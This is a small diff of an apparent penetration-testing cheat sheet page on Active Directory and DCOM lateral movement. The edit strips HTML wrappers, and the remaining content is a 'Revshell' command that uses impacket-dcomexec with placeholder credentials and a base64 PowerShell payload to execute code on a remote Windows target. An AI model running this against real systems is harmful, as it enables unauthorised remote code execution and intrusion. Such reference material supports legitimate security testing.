@@ -9,15 +9,9 @@ tags: ["ExecuteDCOM", "active driectory", "ad", "Windows", "dcsync", "secretsdum
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 # Revshell
 impacket-dcomexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '<POWERSHELL_3_BASE64>' -silentcommand -object MMC20
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
